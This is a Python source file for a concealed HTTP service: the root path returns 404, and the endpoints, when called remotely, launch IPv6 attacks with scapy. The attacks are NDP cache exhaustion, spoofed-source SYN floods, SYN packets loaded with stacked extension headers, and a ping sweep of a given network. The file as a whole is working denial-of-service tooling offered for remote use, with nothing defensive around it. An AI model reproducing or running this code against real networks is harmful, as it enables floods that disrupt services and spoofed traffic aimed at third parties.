#!/usr/bin/env python
#

import socket
from socket import *
import optparse
import datetime
import time
from scapy.all import *
from scapy.layers.inet6 import *
import random
from flask import Flask, jsonify


app = Flask(__name__)

def randstring(length=10):
    valid_letters='0123456789abcdef'
    return ''.join((random.choice(valid_letters) for i in xrange(length)))

@app.route('/')
def hide_service():
	abort(404)

@app.route('/about')
def about():
	return 'tuoba'

@app.route('/ndpexhaustion/<path:network>/<path:numpkts>')
def ndpexhaustion(network,numpkts):
    try:
        for i in range(int(numpkts)):
            source_ip = str(network) + randstring(4) + ":" + randstring(4)+ ":" + randstring(4) + ":" + randstring(4)
            destination_ip = str(network) + randstring(4) + ":" + randstring(4) + ":" + randstring(4) + ":" + randstring(4)
            p=IPv6(dst=str(destination_ip), src=str(source_ip))/ICMPv6EchoRequest()
            send(p,verbose=False)
            print "Packets sent: " + str(i)
        status = "success"
        resume = "Sent " + str(i) +" packets"
    except Exception as err:
        status = "error"
        resume = str(err)
    return jsonify({"status":status,"resume":resume})

@app.route('/multiplesyn/<path:network>/<path:dstip>/<path:numpkts>')
def multiplesyn(network,dstip,numpkts):
    try:
        for i in range(int(numpkts)):
            source_ip = str(network) + randstring(4) + ":" + randstring(4)
            p=IPv6(dst=str(dstip), src=str(source_ip))/TCP(sport=RandShort(), dport=i, flags="S")
            send(p,verbose=False)
            print "Packets sent: " + str(i)
        status = "success"
        resume = "Sent " + str(i) +" packets"
    except Exception as err:
        status = "error"
        resume = str(err)
    return jsonify({"status":status,"resume":resume})

@app.route('/multipleh/<path:network>/<path:dstip>/<path:numpkts>')
def multipleh(network,dstip,numpkts):
    try:
        for i in range(int(numpkts)):
            source_ip = str(network) + randstring(4) + ":" + randstring(4)
            p=IPv6(dst=str(dstip), src=str(source_ip))/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/IPv6ExtHdrDestOpt()/TCP(sport=RandShort(), dport=i, flags="S")
            send(p,verbose=False)
            print "Packets sent: " + str(i)
        status = "success"
        resume = "Sent " + str(i) +" packets"
    except Exception as err:
        status = "error"
        resume = str(err)
    return jsonify({"status":status,"resume":resume})

@app.route('/synflood/<path:srcip>/<path:dstip>/<path:numpkts>')
def synflood(srcip,dstip,numpkts):
    try:
        for i in range(int(numpkts)):
            originip = srcip + randstring(4) + ":" + randstring(4)
            p=IPv6(dst=str(dstip), src=str(originip))/TCP(sport=RandShort(), dport=i, flags="S")
            send(p,verbose=False)
            print "Packets sent: " + str(i)
        status = "success"
        resume = "Sent " + str(i) +" packets"
    except Exception as err:
        status = "error"
        resume = str(err)
    return jsonify({"status":status,"resume":resume})

@app.route('/discover/<path:network>')
def discover(network):
    valid_host_address='0123456789abcdef'
    try:
        for i in range(14):
            target_ip = str(network) + valid_host_address[i]
            p=IPv6(dst=str(target_ip))/ICMPv6EchoRequest()
            send(p,verbose=False)
        print "Packets sent: " + str(i)
        status = "success"
        resume = "sent" + str(i) +" packets"
    except Exception as err:
        status = "error"
        resume = str(err)
    return jsonify({"status":status,"resume":resume})

def main():
    parser = optparse.OptionParser(usage="%prog [options]  or type %prog -h (--help)")
    parser.add_option('-p','--port',
		dest='port',
		action='store',
		help='The port to run server on',
		default=4343)
    (options, args) = parser.parse_args()
    port = int(options.port)
    key="ip"
    #print 'Tornado on port {port}...'.format(port=port)

    from tornado.wsgi import WSGIContainer
    from tornado.httpserver import HTTPServer
    from tornado.ioloop import IOLoop

    http_server = HTTPServer(WSGIContainer(app))

    http_server.listen(int(port))
    IOLoop.instance().start()

if __name__ == '__main__':
	main()

